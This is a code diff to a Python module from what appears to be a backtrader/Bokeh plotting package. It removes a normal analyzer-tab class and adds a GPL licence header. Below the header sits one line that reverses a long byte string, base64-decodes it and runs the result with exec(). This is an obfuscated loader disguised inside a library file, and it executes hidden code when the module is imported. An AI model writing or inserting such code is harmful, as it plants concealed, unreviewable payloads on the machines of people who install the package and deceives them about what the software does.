@@ -1,56 +1,20 @@
-from bokeh.layouts import column, row, gridplot, layout
-from bokeh.models import Paragraph, Spacer, Button
-from ..helper.datatable import AnalysisTableGenerator
-from ..tab import BacktraderBokehTab
+#!/usr/bin/env python
+# -*- coding: utf-8; py-indent-offset:4 -*-
+#
+# Author: Metaer @ Wed Jun 29 14:58:48 2022
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 
-class AnalyzerTab(BacktraderBokehTab):
-
-    def __init__(self, app, figurepage, client=None):
-        super(AnalyzerTab, self).__init__(app, figurepage, client)
-        self.content = None
-
-    def _is_useable(self):
-        return len(self._figurepage.analyzers) > 0
-
-    def _get_analyzer_info(self):
-        tablegen = AnalysisTableGenerator(self._app.scheme)
-        acolumns = []
-        for analyzer in self._figurepage.analyzers:
-            table_header, elements = tablegen.get_tables(analyzer)
-            if table_header and elements:
-                acolumns.append(column([table_header] + elements))
-        info = gridplot(
-            acolumns,
-            ncols=self._app.scheme.analyzer_tab_num_cols,
-            sizing_mode='stretch_width',
-            toolbar_options={'logo': None})
-        return info
-
-    def _on_update_analyzer_info(self):
-        self.content.children[1] = self._get_analyzer_info()
-
-    def _create_content(self):
-        title_area = []
-        title = Paragraph(
-            text='Available Analyzer Results',
-            css_classes=['panel-title'])
-        title_area.append(row([title], width_policy='min'))
-        if self._client:
-            btn_refresh = Button(label='Refresh', width_policy='min')
-            btn_refresh.on_click(self._on_update_analyzer_info)
-            title_area.append(Spacer())
-            title_area.append(row([btn_refresh], width_policy='min'))
-        # set content in self
-        return layout(
-            [
-                title_area,
-                # initialize with info
-                [self._get_analyzer_info()]
-            ],
-            sizing_mode='stretch_width')
-
-    def _get_panel(self):
-        if self.content is None:
-            self.content = self._create_content()
-        return self.content, 'Analyzers'
+_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'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'))
